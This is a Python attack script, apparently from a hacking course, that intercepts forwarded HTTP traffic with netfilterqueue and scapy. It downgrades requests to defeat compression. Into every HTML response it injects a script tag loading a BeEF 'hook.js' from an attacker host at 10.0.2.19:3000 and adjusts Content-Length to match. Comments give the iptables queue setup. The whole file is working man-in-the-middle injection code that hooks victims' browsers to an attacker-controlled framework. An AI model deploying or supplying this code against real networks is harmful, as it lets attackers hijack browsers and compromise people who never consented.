# using Iptable tool in k-linux to put the forwarding packages in a que. Then I will enter the que to modify the packages.
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# To test locally. Change the chain from FORWARD to output and input.

# NB: remember to flush your iptables when you are done. iptables --flush
# user of the program needs to install netfilterqueue (pip install netfilterqueue)

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Respond")
            print(scapy_packet.show())
            # injects my hook.js code that connects me to beef (apt-get install beef-xss)
            injection_code = '<script src="http://10.0.2.19:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code+"</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length)+len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
